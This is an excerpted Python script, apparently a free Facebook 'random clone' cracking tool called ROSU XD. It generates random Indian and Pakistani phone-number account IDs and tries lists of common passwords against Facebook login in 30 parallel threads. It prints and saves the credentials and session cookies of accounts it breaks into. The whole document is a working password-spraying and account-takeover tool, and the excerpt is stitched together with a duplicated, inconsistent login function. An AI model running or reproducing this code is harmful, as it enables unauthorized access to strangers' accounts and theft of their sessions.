...
ua_default = 'Mozilla/5.0 (Linux; Android 12; SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.3.4095.74759'
...
logo = """       
\033[1;32m  _____   ____   _____ _    _  __   _______  
 |  __ \ / __ \ / ____| |  | | \ \ / /  __ \ 
\033[1;35m| |__) | |  | | (___ | |  | |  \ V /| |  | | 
\033[1;33m|  _  /| |  | |\___ \| |  | |   > < | |  | |
\033[1;37m| | \ \| |__| |____) | |__| |  / . \| |__| |
\033[1;34m|_|  \_\\____/|_____/ \____/  /_/ \_\_____/ 
     
\033[1;32m(•)==============================================🥀
\033[1;33m[•] \033[1;33mCREATED BY   :  \033[1;33mRAUSHAN XD
\033[1;35m[•] \033[1;34mON FACEBOK   :  \033[1;34mRAUSHAN SINGH
\033[1;37m[•] \033[1;35mON GITHUB    :  \033[1;35mRAUSHAN XD
\033[1;31m[•] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;36m[•] \033[1;36mBEST FRIEND  :  \033[1;36mHONEY☝️😍
\033[1;34m(•)==============================================🤍\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/raushan.siingh")
		menu()
    #if opt =='0':
    	#exit()
    #else:
    	#print('GALT CHOOSE YOUR CODE🥺')
    #menu()
...
def random_crack():
	...
	print('[3]\033[1;33m BANGAL RANODOM CLONE')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 9670,9919,9918,8795,9725,9915")
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'59039200','57573200','57575751','57575752','free fire','Free Fire','i love you','freefire123']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[•] Ids saved in ROSU XDok.txt,ROSU XDcp.txt')
	print(47*"-")
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=UOgWZelGmrhy3qfK39StbFwB; sb=UOgWZRe3jONrXUvt2o-Ks0re',
    'dpr': '1.875',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 30 Pro 5G Build/QQ2A.200305.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0 Mobile Safari/90.0.4430.210 OPR/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[ROSU XD-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('ROSU XD-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[ROSU XD-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[ROSU XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'57573200','59039200','57575751','57575752','khankhan123','pakistan','khan12345','alikhan12345','aliali','janjan','ali1122','khann1122','786786','khan123','khan786']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ROSU XDok.txt,ROSU XDcp.txt')
...
def rcrack(uid,pwx,tl):
    ...
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=KjR4ZFuVf9QKvq31PEHes-0N; sb=KjR4ZEaXO0W8bdV_hQX2qfrw; m_pixel_ratio=2; wd=360x666; fr=0Kgvcy5LoOu9PB8nn..BkeDQq.yf.AAA.0.0.BkeDQ8.AWU3bWqYL0g',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 30 Pro 5G Build/QP1A.191105.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0 Mobile Safari/90.0.4430.210 OPR/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				print('\033[1;91m[ROSU XD-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mROSU XD\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu()